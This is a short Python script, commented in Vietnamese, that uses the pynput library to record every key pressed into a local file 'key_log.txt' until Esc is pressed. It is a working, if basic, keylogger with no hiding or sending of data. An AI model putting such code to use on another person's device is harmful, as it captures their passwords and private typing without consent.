from pynput import keyboard
def on_press(key):
    try:
        # Ghi phím đã nhấn
        with open("key_log.txt", "a") as file:
            file.write('{0} pressed\n'.format(key.char))
    except AttributeError:
        # Xử lý phím đặc biệt (như phím Shift, Ctrl)
        with open("key_log.txt", "a") as file:
            file.write('{0} pressed\n'.format(key))

def on_release(key):
    # Kết thúc khi nhấn phím Esc
    if key == keyboard.Key.esc:
        return False

# Tạo một listener cho bàn phím
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()